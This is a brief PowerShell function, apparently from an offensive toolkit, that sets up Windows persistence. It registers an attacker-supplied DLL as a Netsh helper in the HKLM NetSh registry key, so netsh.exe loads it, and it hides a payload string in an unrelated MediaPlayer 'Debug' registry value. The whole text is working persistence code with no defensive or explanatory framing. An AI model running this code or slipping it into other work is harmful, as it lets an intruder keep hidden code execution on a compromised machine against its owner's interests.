function Add-PersistNetshDLL {

    [CmdletBinding()]
            Param(
            [Parameter(Mandatory)]
            [string]$Path, # TODO: Check if you can use a network path for this

            [Parameter(Mandatory=$false)]
            [string]$Name = "NetshHelper",

            [Parameter(Mandatory)]
            [string]$Payload
            )

    # Create helper dll entry
    New-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\NetSh" -Name "$Name" -Value "$Path" -PropertyType String | Out-Null
    
    # Set payload value
    New-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\MediaPlayer" -Name Debug -Value "$Payload" -PropertyType String | Out-Null
}